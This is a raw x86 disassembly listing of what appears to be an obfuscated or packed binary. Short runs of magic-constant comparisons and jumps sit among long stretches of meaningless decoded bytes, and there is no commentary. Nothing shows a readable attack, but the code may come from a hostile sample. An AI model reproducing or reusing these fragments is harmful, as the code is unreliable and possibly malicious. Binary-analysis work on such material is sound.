  4072bb:	cmp    eax,0x9155269c
  4072c0:	je     0x4076db
  4072c6:	mov    edi,DWORD PTR ds:0x4346ef
  4072cc:	mov    eax,ds:0x434733
  4072d1:	sub    eax,edi
  4072d3:	sub    edi,DWORD PTR [edi+eax*1]
  4072d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4072d9:	or     DWORD PTR [eax],0x60751c9d
  4072df:	mov    eax,DWORD PTR [ebp-0x8]
  4072e2:	xor    eax,ecx
  4072e4:	add    eax,esi
  4072e6:	pop    edi
  4072e7:	pop    esi
  4072e8:	jmp    0x4076d6
  4072ed:	pop    ds
  4072ee:	add    al,0x2a
  4072f0:	or     eax,0x2c313d35
  4072f5:	add    eax,0xa4907a48
  4072fa:	loope  0x4072c6
  4072fc:	daa    
  4072fd:	aas    
  4072fe:	iret   
  4072ff:	jle    0x40737f
  407301:	dec    edi
  407302:	jns    0x407382
  407304:	jle    0x407341
  407306:	or     al,0x92
  407308:	data16 fcmove st,st(3)
  40730b:	sbb    BYTE PTR [ebx+0x66d26463],al
  407311:	fisttp DWORD PTR [ebp-0x7187504f]
  407317:	mov    ecx,0xd3b6bcf3
  40731c:	adc    esi,DWORD PTR ds:0xbe75f9d
  407322:	cmp    ebp,edi
  407324:	dec    eax
  407325:	adc    ebx,DWORD PTR [ebx-0x6a38e554]
  40732b:	jbe    0x4072d6
  40732d:	call   0x2070:0x94c1e818
  407334:	bound  esp,QWORD PTR [esi+edi*4-0x17]
  407338:	mov    ebp,0xded2b26d
  40733d:	add    al,0xc3
  40733f:	int    0x4e
  407341:	hlt    
  407342:	sbb    cl,BYTE PTR [edi-0x49]
  407345:	hlt    
  407346:	jge    0x407341
  407348:	adc    BYTE PTR [esi],dl
  40734a:	lds    edx,FWORD PTR [ebx]
  40734c:	pop    ebx
  40734d:	aas    
  40734e:	cmp    edi,DWORD PTR [edx+ebp*4-0x6b]
  407352:	popa   
  407353:	aad    0xd8
  407355:	add    al,dh
  407357:	jp     0x407352
  407359:	cwde   
  40735a:	xor    BYTE PTR [ecx],bl
  40735c:	hlt    
  40735d:	repnz pop ebx
  40735f:	fadd   QWORD PTR [ebx-0x1a]
  407362:	aam    0xa2
  407364:	fwait
  407365:	(bad)  
  407366:	stc    
  407367:	ds enter 0xfdfb,0xaa
  40736c:	xor    esp,DWORD PTR [esi-0x2e]
  40736f:	jmp    0xa9521ef4
  407374:	sbb    ebx,DWORD PTR ds:[ebp+0x4f35b12c]
  40737b:	mov    ebp,0xbfbd0dd2
  407380:	sbb    al,BYTE PTR [esi-0x640650ec]
  407386:	mov    edx,0x8c260db3
  40738b:	add    BYTE PTR ds:0x39abbeae,dh
  407391:	cmp    cl,BYTE PTR [ebx]
  407393:	or     ch,BYTE PTR [ecx]
  407395:	into   
  407396:	jg     0x4073ee
  407398:	or     eax,DWORD PTR [edi]
  40739a:	xchg   BYTE PTR [ecx-0x6a96c472],dh
  4073a0:	cmc    
  4073a1:	call   0x80537d1b
  4073a6:	sti    
  4073a7:	xchg   ecx,eax
  4073a8:	repz rcl BYTE PTR [edi+ebp*8],1
  4073ac:	mov    eax,0x983d75b2
  4073b1:	out    dx,al
  4073b2:	lods   eax,DWORD PTR ds:[esi]
  4073b4:	fisubr WORD PTR [ebx+0x110bfeeb]
  4073ba:	mov    edi,0x25e53bda
  4073bf:	bound  esp,QWORD PTR [ecx]
  4073c1:	jmp    0xd4f4:0x20096760
  4073c8:	mov    ch,0x10
  4073ca:	or     DWORD PTR [esi-0x15],ebx
  4073cd:	bound  ebp,QWORD PTR [ebx+0x7d]
  4073d0:	dec    BYTE PTR gs:0x62877a3
  4073d7:	inc    eax
  4073d8:	xor    eax,edi
  4073da:	xchg   ebp,eax
  4073db:	inc    ebx
  4073dc:	sub    DWORD PTR [edx+0x20b055a6],esi
  4073e2:	arpl   bp,si
  4073e4:	dec    edi
  4073e5:	call   0x4b2bf593
  4073ea:	mov    eax,ds:0x8e1dd479
  4073ef:	lods   al,BYTE PTR ds:[esi]
  4073f0:	fiadd  DWORD PTR [ebx]
  4073f2:	mov    ebp,0x50ea31b9
  4073f7:	xor    esi,esp
  4073f9:	push   cs
  4073fa:	pop    edi
  4073fb:	test   BYTE PTR [edi],bh
  4073fd:	jbe    0x4073b3
  4073ff:	lea    ebp,[esp+ebx*4-0x2050de63]
  407406:	sbb    BYTE PTR [esi-0x20e19c15],bl
  40740c:	jae    0x4073a1
  40740e:	inc    ebx
  40740f:	pop    esp
  407410:	faddp  st(3),st
  407412:	in     al,dx
  407413:	lods   al,BYTE PTR ds:[esi]
  407414:	gs pop esi
  407416:	cmp    al,0x95
  407418:	in     eax,0x25
  40741a:	loope  0x407465
  40741c:	xchg   ecx,eax
  40741d:	mov    BYTE PTR [ebx-0x118a5ec],bl
  407423:	iret   
  407424:	(bad)  
  407425:	push   cs
  407426:	push   esp
  407427:	out    0x5,al
  407429:	adc    al,0xe2
  40742b:	jbe    0x4073ff
  40742d:	inc    esi
  40742e:	add    edi,DWORD PTR [esi-0x7b]
  407431:	into   
  407432:	mov    al,ds:0xfda57032
  407437:	call   0xc6cb9526
  40743c:	shr    DWORD PTR [ecx-0x4],0xf6
  407440:	mov    ch,0xb0
  407442:	shr    BYTE PTR [ebx+0x38],cl
  407445:	push   esp
  407446:	inc    ebp
  407447:	loopne 0x40748b
  407449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40744a:	or     al,0x2a
  40744c:	jecxz  0x4073e0
  40744e:	pop    eax
  40744f:	in     al,0xd9
  407451:	push   0xffffff8a
  407453:	jnp    0x40748f
  407455:	mov    cl,dl
  407457:	add    esp,ebp
  407459:	add    eax,0xa21a8419
  40745e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40745f:	out    dx,eax
  407460:	push   0xfa1a432
  407465:	cwde   
  407466:	inc    esi
  407467:	xchg   ebp,eax
  407468:	or     eax,0xcefcffd6
  40746d:	js     0x407472
  40746f:	out    0xd3,al
  407471:	jg     0x40747b
  407473:	and    eax,0x469d5e0d
  407478:	loop   0x4074a2
  40747a:	out    0xc,eax
  40747c:	outs   dx,BYTE PTR ds:[esi]
  40747d:	dec    cl
  40747f:	push   ss
  407480:	add    BYTE PTR [esi+0x686dc403],bl
  407486:	lahf   
  407487:	adc    al,bl
  407489:	shl    esp,1
  40748b:	lea    ecx,[edx-0x5a]
  40748e:	or     esp,0xe35704b1
  407494:	fistp  QWORD PTR [eax-0x5e]
  407497:	in     eax,0xfa
  407499:	ins    BYTE PTR es:[edi],dx
  40749a:	call   0x2341:0xf8a82ca0
  4074a1:	in     eax,0xb
  4074a3:	dec    esp
  4074a4:	cmp    bh,ah
  4074a6:	iret   
  4074a7:	mov    cl,0xd9
  4074a9:	adc    BYTE PTR [ebx-0x2b06a12e],dh
  4074af:	ins    BYTE PTR es:[edi],dx
  4074b0:	dec    edx
  4074b1:	sbb    DWORD PTR [ecx-0x1e572709],0xffffffce
  4074b8:	loope  0x4074a6
  4074ba:	inc    ebp
  4074bb:	sub    DWORD PTR [esi],ebp
  4074bd:	ins    DWORD PTR es:[edi],dx
  4074be:	loop   0x4074f2
  4074c0:	xor    ebx,ebp
  4074c2:	inc    esi
  4074c3:	dec    eax
  4074c4:	mov    al,0x44
  4074c6:	ja     0x407515
  4074c8:	xor    ch,ah
  4074ca:	sbb    edx,DWORD PTR [eax]
  4074cc:	les    ecx,FWORD PTR [esi-0x92d6901]
  4074d2:	pop    esi
  4074d3:	xchg   esp,eax
  4074d4:	adc    BYTE PTR [ebp+0x43460902],cl
  4074da:	push   0xffffff88
  4074dc:	shr    DWORD PTR [esi],1
  4074de:	dec    eax
  4074df:	std    
  4074e0:	repnz add DWORD PTR [ecx+edi*8+0x7ba25997],edx
  4074e8:	sti    
  4074e9:	int3   
  4074ea:	sbb    ch,BYTE PTR [edx+0x218ef27d]
  4074f0:	jno    0x40751f
  4074f2:	dec    edx
  4074f3:	mov    al,0x8e
  4074f5:	or     al,BYTE PTR [eax]
  4074f7:	cmp    bl,0x2c
  4074fa:	sub    eax,0xc725cbf1
  4074ff:	sub    edi,DWORD PTR [esi]
  407501:	outs   dx,BYTE PTR ds:[esi]
  407502:	fadd   st,st(4)
  407504:	ret    0x1149
  407507:	cdq    
  407508:	pop    edx
  407509:	push   ebp
  40750a:	xchg   edi,eax
  40750b:	inc    esi
  40750c:	push   ds
  40750d:	(bad)  
  40750f:	aaa    
  407510:	lds    ebp,FWORD PTR cs:[ebx-0x5b68b349]
  407517:	loope  0x40758a
  407519:	aam    0xa0
  40751b:	push   esp
  40751c:	cli    
  40751d:	out    0x46,al
  40751f:	xlat   BYTE PTR ds:[ebx]
  407520:	cmp    DWORD PTR [esp+edx*8],ebx
  407523:	add    al,0x6d
  407525:	mov    BYTE PTR [esi-0x77c4295d],bl
  40752b:	dec    esp
  40752c:	sbb    ecx,DWORD PTR [esp+ebx*8+0x27cddc48]
  407533:	xchg   DWORD PTR [ebx-0x7a3788cb],ecx
  407539:	jo     0x4074f8
  40753b:	cld    
  40753c:	xor    eax,0xa84d2717
  407541:	and    DWORD PTR [esi-0x5b27275d],0xffffffda
  407548:	push   ss
  407549:	dec    esi
  40754a:	wbinvd 
  40754c:	jge    0x407560
  40754e:	test   DWORD PTR [esi+0x26],ebp
  407551:	sbb    al,dh
  407553:	call   0xcdb8:0x785c60a1
  40755a:	xor    al,0x78
  40755c:	in     eax,dx
  40755d:	inc    ebp
  40755e:	cmp    al,0x2b
  407560:	xchg   esp,eax
  407561:	fdiv   DWORD PTR [ecx-0x7]
  407564:	mov    ch,0xb0
  407566:	sub    edx,DWORD PTR [edi+0x2d]
  407569:	in     eax,0x2c
  40756b:	pop    ebp
  40756c:	sbb    DWORD PTR [edx],esp
  40756e:	mov    ebx,0x2b40ff82
  407573:	cld    
  407574:	rcr    BYTE PTR [eax+0x27b87848],cl
  40757a:	xchg   ebx,eax
  40757b:	imul   ebx,esi,0xffffffbb
  40757e:	gs in  al,dx
  407580:	stos   BYTE PTR es:[edi],al
  407581:	mov    ebp,0x1ce4d380
  407586:	(bad)  
  407587:	xor    eax,0xece69efb
  40758c:	cmp    eax,0xf36bdfba
  407591:	clc    
  407592:	sub    edi,DWORD PTR ds:0x3fb9d126
  407598:	sbb    bl,BYTE PTR ds:0xafc6d715
  40759e:	pop    es
  40759f:	and    al,0xce
  4075a1:	mov    ecx,0x6f859264
  4075a6:	inc    ebp
  4075a7:	xor    dl,BYTE PTR [ebp+0x61353b28]
  4075ad:	daa    
  4075ae:	pushf  
  4075af:	or     al,0x63
  4075b1:	or     eax,0x94d505a6
  4075b6:	rol    bl,0x5e
  4075b9:	dec    ecx
  4075ba:	sbb    BYTE PTR [ecx],0x7f
  4075bd:	dec    ecx
  4075be:	outs   dx,BYTE PTR ds:[esi]
  4075bf:	sti    
  4075c0:	and    eax,DWORD PTR [ebp+0x6693b187]
  4075c6:	xchg   esp,eax
  4075c7:	pusha  
  4075c8:	mov    WORD PTR [edi+eax*1+0x4f048da3],ds
  4075cf:	add    DWORD PTR ds:[ebx-0x6581bfdd],ecx
  4075d6:	pop    ds
  4075d7:	cmp    al,BYTE PTR [ecx+ebp*8+0x69]
  4075db:	addr16 (bad) 
  4075de:	mov    dh,0xc7
  4075e0:	jmp    0xe13c:0x7eb4263c
  4075e7:	je     0x407581
  4075e9:	jo     0x4075b0
  4075eb:	pop    ss
  4075ec:	outs   dx,DWORD PTR ds:[esi]
  4075ed:	push   eax
  4075ee:	outs   dx,BYTE PTR es:[esi]
  4075f0:	mov    ds:0xf6095e1e,al
  4075f5:	fimul  DWORD PTR [ebx+edx*4-0x698c0843]
  4075fc:	ret    
  4075fd:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4075ff:	add    edx,DWORD PTR [eax+ecx*4+0x2ad28186]
  407606:	retf   
  407607:	ror    DWORD PTR [eax],0xc6
  40760a:	fstp   TBYTE PTR [eax]
  40760c:	sbb    eax,0xe3c6d981
  407611:	pushf  
  407612:	dec    esp
  407613:	push   ds
  407614:	inc    esp
  407615:	(bad)  [edi-0x2e752b89]
  40761b:	(bad)  
  40761c:	outs   dx,BYTE PTR ds:[esi]
  40761d:	add    cl,bh
  40761f:	imul   BYTE PTR [ecx]
  407621:	mov    bh,0x69
  407623:	call   0xeae785e4
  407628:	imul   edi,DWORD PTR ds:0xd51c17c1,0x2c
  40762f:	outs   dx,DWORD PTR ds:[esi]
  407630:	aas    
  407631:	out    0x32,al
  407633:	inc    di
  407635:	sbb    dl,BYTE PTR ds:0x1d46ca76
  40763b:	pop    ecx
  40763c:	iret   
  40763d:	popf   
  40763e:	ret    
  40763f:	(bad)  [ecx+0x4977b00f]
  407645:	mov    ?,WORD PTR [ebx+0x56]
  407648:	pop    ss
  407649:	into   
  40764a:	pop    DWORD PTR ds:0xc90efa54
  407650:	mov    ds,ecx
  407652:	fwait
  407653:	dec    esp
  407654:	leave  
  407655:	leave  
  407656:	scas   al,BYTE PTR es:[edi]
  407657:	imul   ebx,esi,0x99fcd9cb
  40765d:	mov    bh,0x10
  40765f:	test   al,0xdf
  407661:	test   DWORD PTR [ecx+0x5a8e616a],ecx
  407667:	lds    ebp,FWORD PTR [edx+0x69]
  40766a:	cmp    eax,0x9e99f1e2
  40766f:	test   al,0x1d
  407671:	pop    dx
  407673:	mov    edi,DWORD PTR [esi]
  407675:	mov    ds:0x5dff4a4,eax
  40767a:	sahf   
  40767b:	ss cwde 
  40767d:	clc    
  40767e:	int3   
  40767f:	or     BYTE PTR ds:0x2f39a6ce,0xc3
  407686:	adc    BYTE PTR [edi-0x24],ah
  407689:	mov    ah,0x16
  40768b:	js     0x407707
  40768d:	mov    dl,0xde
  40768f:	fsub   QWORD PTR [esi+0x25]
  407692:	stos   BYTE PTR es:[edi],al
  407693:	retf   0x27ad
  407696:	fstp   DWORD PTR [ebx]
  407698:	jno    0x407662
  40769a:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40769c:	(bad)  
  40769e:	inc    esp
  40769f:	fidiv  WORD PTR [eax]
  4076a1:	psubsb mm1,QWORD PTR [ebx-0x3a]
  4076a5:	xchg   esp,eax
  4076a6:	je     0x4076f0
  4076a8:	and    dl,BYTE PTR [ebp+0x724ebd1d]
  4076ae:	in     al,dx
  4076af:	icebp  
  4076b0:	push   ss
  4076b1:	inc    edx
  4076b2:	(bad)  [ebp+0x71]
  4076b5:	bound  ebx,QWORD PTR [eax+0x30]
  4076b8:	xchg   ebx,eax
  4076b9:	rcr    edi,cl
  4076bb:	nop
  4076bc:	dec    esi
  4076bd:	cmc    
  4076be:	inc    ebp
  4076bf:	int3   
  4076c0:	outs   dx,BYTE PTR ds:[esi]
  4076c1:	mov    edi,0x8f3b9c44
  4076c6:	sti    
  4076c7:	aad    0xc3
  4076c9:	cmp    al,0xc
  4076cb:	(bad)  
  4076cc:	mov    ebx,0x14e16252
  4076d1:	out    dx,eax
  4076d2:	loopne 0x4076b5
  4076d4:	sub    al,dh
  4076d6:	pop    ebx
  4076d7:	leave  
  4076d8:	ret    0x4
  4076db:	mov    eax,DWORD PTR [ebp-0xc]
  4076de:	add    eax,DWORD PTR [ebp-0x18]
  4076e1:	cmp    eax,0x89f4544a
  4076e6:	je     0x4076fa
  4076ec:	mov    eax,DWORD PTR [ebp-0x10]
  4076ef:	and    DWORD PTR [eax],0x751c9e
  4076f5:	jmp    0x4072df
  4076fa:	mov    eax,DWORD PTR [ebp-0xc]
  4076fd:	mov    edx,DWORD PTR [ebp-0x18]
  407700:	or     eax,edx
  407702:	cmp    eax,0xf9df2fbe
  407707:	je     0x407b09
  40770d:	jmp    0x407afb
  407712:	ret    
  407713:	or     esi,DWORD PTR [ebx+eiz*1+0x7c]
  407717:	ins    DWORD PTR es:[edi],dx
  407718:	pop    ebp
  407719:	jmp    0x407762
  40771b:	(bad)  
  40771c:	pop    ecx
  40771d:	sbb    eax,0x5808f764
  407722:	or     bl,cl
  407724:	jle    0x4077a4
  407726:	dec    edi
  407727:	jns    0x4077a7
  407729:	jle    0x407795
  40772b:	cmp    DWORD PTR [ecx-0x5e75335],esp
  407731:	fdiv   DWORD PTR [eax]
  407733:	push   0x870ae8fc
  407738:	out    0x72,eax
  40773a:	push   eax
  40773b:	rol    BYTE PTR [ebx],1
  40773d:	mov    bh,0x90
  40773f:	mov    ds:0x2cc7000,eax
  407744:	test   BYTE PTR [edi-0x7c45a0e5],0xd2
  40774b:	popa   
  40774c:	inc    esp
  40774d:	in     al,dx
  40774e:	mov    DWORD PTR [esi+0x4a],edi
  407751:	sbb    al,BYTE PTR [eax+0x309ff424]
  407757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407758:	cld    
  407759:	ret    0xc855
  40775c:	or     al,0x5d
  40775e:	xor    edx,DWORD PTR [esi+edi*1+0x54b4730f]
  407765:	push   0xffffffa6
  407767:	lods   al,BYTE PTR ds:[esi]
  407768:	sub    eax,0xe249b7f9
  40776d:	cmp    eax,DWORD PTR [ecx]
  40776f:	and    ebp,esp
  407771:	lds    esi,FWORD PTR [esi+0x7b8148c8]
  407777:	and    eax,DWORD PTR [edi+0x28a144f4]
  40777d:	mov    esp,0x1b52404d
  407782:	rcr    BYTE PTR [ecx+eax*2-0xf],1
  407786:	lea    edi,[edi+eiz*1+0x76]
  40778a:	outs   dx,BYTE PTR ds:[esi]
  40778b:	xor    eax,esi
  40778d:	stos   BYTE PTR es:[edi],al
  40778e:	icebp  
  40778f:	test   eax,0x767f4f94
  407794:	sti    
  407795:	iret   
  407796:	push   ss
  407797:	jl     0x4077e4
  407799:	push   ds
  40779a:	ret    0x7bd0
  40779d:	imul   edi,DWORD PTR [esi+0x3e],0x357fe179
  4077a4:	add    al,0xbb
  4077a6:	jnp    0x4077f0
  4077a8:	mov    esi,0x3210eaa8
  4077ad:	jp     0x4077b9
  4077af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077b0:	jne    0x407814
  4077b2:	ds (bad) 
  4077b4:	push   edx
  4077b5:	pop    ss
  4077b6:	neg    DWORD PTR [ebx-0x5b]
  4077b9:	mov    ecx,edi
  4077bb:	sbb    dl,ah
  4077bd:	inc    esi
  4077be:	ds (bad) 
  4077c0:	cs inc edi
  4077c2:	sahf   
  4077c3:	and    ch,BYTE PTR [edi]
  4077c5:	and    BYTE PTR [ebx],dh
  4077c7:	mov    eax,0x8dff94b5
  4077cc:	(bad)  
  4077ce:	cmp    BYTE PTR [ecx],ah
  4077d0:	xor    al,0x38
  4077d2:	in     eax,0x66
  4077d4:	xchg   DWORD PTR [edx+0x11],ebp
  4077d7:	xlat   BYTE PTR ds:[ebx]
  4077d8:	mov    WORD PTR [esi],fs
  4077da:	gs (bad) 
  4077dc:	jno    0x407769
  4077de:	push   ebp
  4077df:	outs   dx,DWORD PTR ds:[esi]
  4077e0:	sub    al,0x4b
  4077e2:	out    0x33,al
  4077e4:	popf   
  4077e5:	nop
  4077e6:	jg     0x407775
  4077e8:	push   ecx
  4077ea:	mov    eax,0x142df67
  4077ef:	cmp    esi,DWORD PTR [esp+edx*1-0x11]
  4077f3:	call   0x881e:0x265ec802
  4077fa:	arpl   si,bp
  4077fc:	icebp  
  4077fd:	dec    esi
  4077fe:	or     ecx,DWORD PTR [ecx+eiz*2-0x39]
  407802:	mov    edx,0x624972d7
  407807:	and    DWORD PTR [ebx+0x1819bb21],esi
  40780d:	adc    esi,edx
  40780f:	xchg   BYTE PTR [ecx+eiz*4+0x4d261f0],dh
  407816:	adc    BYTE PTR ds:0xc52086f1,al
  40781c:	mov    dh,0x9d
  40781e:	inc    ecx
  40781f:	jns    0x407854
  407821:	and    cl,BYTE PTR [edi+ebp*1-0x246fa040]
  407828:	adc    DWORD PTR [ecx+ebp*4],ebx
  40782b:	mov    ebp,0x61490035
  407830:	xchg   ecx,eax
  407831:	lds    ebx,FWORD PTR ds:0xa64dd324
  407837:	fwait
  407838:	or     DWORD PTR [edx+0x17],esp
  40783b:	ds mov cl,0x2b
  40783e:	adc    eax,DWORD PTR [ebx-0x35]
  407841:	gs mov bl,0xb3
  407844:	or     eax,0x13d3a876
  407849:	adc    BYTE PTR ds:0x6fe8110e,bl
  40784f:	ins    DWORD PTR es:[edi],dx
  407850:	mov    esp,0xc4a5d9cc
  407855:	inc    edi
  407856:	fsub   st,st(4)
  407858:	ret    0x1be2
  40785b:	cli    
  40785c:	mov    cs,eax
  40785e:	cli    
  40785f:	call   0xa955:0x587fb45c
  407866:	popa   
  407867:	(bad)  
  407869:	push   es
  40786a:	(bad)  
  40786b:	mov    edx,0xec05e89c
  407870:	push   0xffffffcc
  407872:	daa    
  407873:	cdq    
  407874:	lods   eax,DWORD PTR ds:[esi]
  407875:	push   cs
  407876:	jae    0x4078bd
  407878:	scas   al,BYTE PTR es:[edi]
  407879:	add    esi,DWORD PTR [edx+ebx*1+0x48]
  40787d:	push   0x53
  40787f:	adc    bl,BYTE PTR [ecx]
  407881:	test   eax,0xcc160c38
  407886:	jne    0x4078ac
  407888:	cs clc 
  40788a:	xor    DWORD PTR [edx],esi
  40788c:	jmp    0x1c42e9ab
  407891:	movups XMMWORD PTR [eax+0x6ef415b9],xmm7
  407898:	aad    0x2b
  40789a:	xlat   BYTE PTR ds:[ebx]
  40789b:	jbe    0x4078cb
  40789d:	pop    ds
  40789e:	fld    QWORD PTR [ebp-0x3014f1a8]
  4078a4:	mov    dh,0x80
  4078a6:	add    al,0x4a
  4078a8:	lahf   
  4078a9:	mov    ah,0xde
  4078ab:	mov    al,ds:0xf332633e
  4078b0:	sbb    dl,ch
  4078b2:	(bad)  
  4078b3:	pop    esi
  4078b4:	in     al,0x4e
  4078b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078b7:	in     al,0x1a
  4078b9:	add    DWORD PTR [edi],edx
  4078bb:	(bad)  
  4078bc:	sbb    dh,BYTE PTR [esi-0x6c]
  4078bf:	std    
  4078c0:	int    0x13
  4078c2:	stos   BYTE PTR es:[edi],al
  4078c3:	add    BYTE PTR [ecx-0x40],bh
  4078c6:	mov    edi,0x11c6858e
  4078cb:	sub    BYTE PTR [eax-0x7f3189cc],ch
  4078d1:	dec    esp
  4078d2:	jmp    0xeb6119e5
  4078d7:	(bad)  
  4078d8:	aaa    
  4078d9:	sbb    edx,DWORD PTR [esi]
  4078db:	jge    0x4078da
  4078dd:	pushf  
  4078de:	aad    0x67
  4078e0:	(bad)  
  4078e1:	shr    BYTE PTR [esi-0x3f],cl
  4078e4:	xchg   ecx,eax
  4078e5:	cld    
  4078e6:	xor    al,0x9a
  4078e8:	daa    
  4078e9:	jmp    0xde150e22
  4078ee:	aaa    
  4078ef:	mov    al,0x56
  4078f1:	enter  0x8b63,0x68
  4078f5:	xor    al,0x83
  4078f7:	(bad)  
  4078f8:	sti    
  4078f9:	clc    
  4078fa:	pop    edi
  4078fb:	mov    bh,0x6f
  4078fd:	test   eax,0x46215f2f
  407902:	xchg   esi,eax
  407903:	(bad)  
  407904:	mov    ds:0xb5f6b803,al
  407909:	data16 lock ins BYTE PTR es:[edi],dx
  40790c:	stos   DWORD PTR es:[edi],eax
  40790d:	fcmovbe st,st(4)
  40790f:	push   esp
  407910:	in     al,0x8e
  407912:	mov    esp,0x97b52507
  407917:	inc    esi
  407918:	xchg   DWORD PTR [ecx+0x3273d662],edx
  40791e:	fdivp  st(6),st
  407920:	sub    eax,0x26e2c762
  407925:	or     al,0x10
  407927:	pop    esi
  407928:	retf   
  407929:	mov    ss,WORD PTR [ebx-0x4b]
  40792c:	bound  eax,QWORD PTR ds:0xb1b7e0d8
  407932:	jle    0x4078b8
  407934:	xor    eax,DWORD PTR [edx-0x6594b2f9]
  40793a:	push   ss
  40793b:	jp     0x40798c
  40793d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793e:	fwait
  40793f:	cmp    ebx,DWORD PTR [ecx]
  407941:	or     esp,ecx
  407943:	(bad)  [edx]
  407945:	dec    eax
  407946:	add    eax,0x3c7e3d58
  40794b:	je     0x407978
  40794d:	inc    ecx
  40794e:	into   
  40794f:	jb     0x4078f2
  407951:	sti    
  407952:	cli    
  407953:	jnp    0x407997
  407955:	popf   
  407956:	inc    eax
  407957:	fidivr WORD PTR [esi+0x49]
  40795a:	(bad)  
  40795b:	aad    0xfb
  40795d:	jns    0x40797d
  40795f:	fadd   st,st(3)
  407961:	adc    al,BYTE PTR [esi-0x9]
  407964:	outs   dx,BYTE PTR ds:[esi]
  407965:	lds    esi,FWORD PTR [edx-0x655c5f12]
  40796b:	xchg   ecx,eax
  40796c:	pop    es
  40796d:	addr16 cdq 
  40796f:	stos   BYTE PTR es:[edi],al
  407970:	cmp    edx,DWORD PTR [ebx+0x6f]
  407973:	push   edx
  407974:	fidivr WORD PTR [esi]
  407976:	sub    ebx,ecx
  407978:	mov    ebp,DWORD PTR [eax-0x38cc4d56]
  40797e:	jne    0x4079a1
  407980:	pop    edx
  407981:	fs jns 0x4079ce
  407984:	mov    dl,0x12
  407986:	fld    st(6)
  407988:	adc    al,0x9b
  40798a:	fmul   QWORD PTR cs:[edx+edx*8+0xb]
  40798f:	retf   0x371c
  407992:	xor    ch,BYTE PTR [ebx-0x5c]
  407995:	shl    ah,0x0
  407998:	shr    DWORD PTR [ebx-0x7702939c],1
  40799e:	scas   al,BYTE PTR es:[edi]
  40799f:	sbb    al,0x22
  4079a1:	fisub  DWORD PTR [edi]
  4079a3:	xor    al,0x38
  4079a5:	xlat   BYTE PTR ds:[ebx]
  4079a6:	mov    dh,0xe3
  4079a8:	aad    0x12
  4079aa:	arpl   WORD PTR [eax+0x2f9334db],cx
  4079b0:	or     al,0x90
  4079b2:	scas   al,BYTE PTR es:[edi]
  4079b3:	sub    eax,0xbfbf5619
  4079b8:	add    eax,0x25545b80
  4079bd:	mov    dl,0xb6
  4079bf:	pop    ecx
  4079c0:	mov    ds:0xaa6bb7e1,al
  4079c5:	sub    eax,0x3e8f59c7
  4079ca:	outs   dx,BYTE PTR ds:[esi]
  4079cb:	neg    BYTE PTR [eax-0x54618dd4]
  4079d1:	fcom   st(4)
  4079d3:	fucomp st(2)
  4079d5:	xchg   ebx,eax
  4079d6:	or     eax,0x793fafa7
  4079db:	int3   
  4079dc:	cld    
  4079dd:	sub    dh,BYTE PTR gs:[esi]
  4079e0:	lods   eax,DWORD PTR ds:[esi]
  4079e1:	cld    
  4079e2:	sub    bh,BYTE PTR [edx]
  4079e4:	sbb    eax,esi
  4079e6:	je     0x407a0e
  4079e8:	lds    ecx,FWORD PTR [ebx]
  4079ea:	add    ch,ch
  4079ec:	sbb    dl,BYTE PTR cs:[esi+esi*8+0x3e]
  4079f1:	ds mov cs,eax
  4079f4:	inc    edx
  4079f5:	pop    eax
  4079f6:	mov    eax,ds:0xeaa0c994
  4079fb:	out    dx,al
  4079fc:	lods   eax,DWORD PTR ds:[esi]
  4079fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079fe:	addr16 or edi,esp
  407a01:	add    DWORD PTR [eax],edx
  407a03:	xchg   ebx,eax
  407a04:	out    dx,eax
  407a05:	lahf   
  407a06:	inc    esi
  407a07:	fsubrp st(6),st
  407a09:	mov    cl,0x64
  407a0b:	and    BYTE PTR [ebx+0x6b3b4d9f],0x59
  407a12:	imul   edx,DWORD PTR [ecx],0xc6564ecc
  407a18:	sbb    DWORD PTR ds:0xdabbf9b4,0xffffffba
  407a1f:	pop    esp
  407a20:	ret    
  407a21:	shl    BYTE PTR [ecx],0xcc
  407a24:	xchg   esp,eax
  407a25:	push   eax
  407a26:	or     eax,0xc3bc0f30
  407a2b:	xchg   ecx,eax
  407a2c:	xor    cl,bl
  407a2e:	push   ebp
  407a2f:	push   esp
  407a30:	xchg   edx,eax
  407a31:	sbb    DWORD PTR [edi+0x1b677d0c],esp
  407a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a38:	push   ds
  407a39:	inc    edi
  407a3a:	dec    ebx
  407a3b:	push   0x966967f8
  407a40:	and    DWORD PTR [edx-0x14fba0],esi
  407a46:	nop
  407a47:	lahf   
  407a48:	pop    ebx
  407a49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a4a:	aad    0xaf
  407a4c:	out    0xa2,al
  407a4e:	paddusw mm6,QWORD PTR ds:0xc6795e1a
  407a55:	fist   DWORD PTR [eax+0x2d]
  407a58:	lds    edi,FWORD PTR [edx-0x6af606a8]
  407a5e:	add    al,0x1c
  407a60:	mov    WORD PTR [eax],fs
  407a62:	push   edx
  407a63:	jge    0x407aa2
  407a65:	out    dx,al
  407a66:	xchg   esi,eax
  407a67:	push   cs
  407a68:	cmp    bl,BYTE PTR [eax+eiz*1]
  407a6b:	lods   eax,DWORD PTR ds:[esi]
  407a6c:	pop    ebx
  407a6d:	xchg   esi,eax
  407a6e:	test   esi,edi
  407a70:	mov    bl,0x80
  407a72:	pop    ebp
  407a73:	add    eax,0x8708e2c0
  407a78:	(bad)  
  407a79:	fcom   DWORD PTR [ebx+edi*1]
  407a7c:	repnz out dx,al
  407a7e:	retf   0xce83
  407a81:	ret    0x7f1f
  407a84:	jns    0x407a51
  407a86:	and    bh,BYTE PTR [edx-0x59]
  407a89:	add    BYTE PTR [edx],bh
  407a8b:	jle    0x407a3d
  407a8d:	daa    
  407a8e:	and    eax,0x8bb13c6e
  407a93:	addr16 ss imul ebx,ebx,0x56
  407a98:	mov    edi,0xfff4ee52
  407a9d:	jbe    0x407ac0
  407a9f:	adc    esp,DWORD PTR ds:0x9f855af7
  407aa5:	jmp    0x407a99
  407aa7:	jae    0x407a73
  407aa9:	mov    al,0xc
